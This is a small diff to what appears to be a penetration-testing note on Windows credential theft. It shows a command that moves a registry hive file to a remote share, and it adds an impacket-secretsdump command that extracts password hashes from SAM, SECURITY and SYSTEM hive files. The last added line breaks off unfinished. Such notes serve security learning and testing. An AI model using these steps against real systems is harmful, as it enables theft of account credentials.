@@ -17,3 +17,8 @@ move <hivefile> \\<ip>\<share>
 ```
 
 After that, we can use impacket-secretsdump to extract the hashes
+```
+impacket-secretsdump -sam <samfile> -security <securityfile> -system <systemfile> -outputfile <fname> LOCAL
+```
+
+After that, 
